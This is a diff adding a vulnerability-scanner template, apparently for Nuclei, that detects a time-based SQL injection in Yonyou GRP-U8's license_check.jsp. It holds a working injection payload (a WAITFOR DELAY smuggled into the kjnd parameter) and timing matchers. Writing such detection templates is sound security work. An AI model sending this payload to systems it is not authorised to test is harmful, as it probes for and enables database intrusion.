@@ -1,0 +1,22 @@
+id: yonyou-grp-u8-license-check-sqli
+
+info:
+  name: Yonyou GRP-U8 license_check.jsp - SQL Injection
+  author: qwtd
+  severity: high
+  tags: 用友-GRP-U8
+
+http:
+  - raw:
+      - |
+          GET /u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
+          Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+      - type: status
+        status:
+          - 200
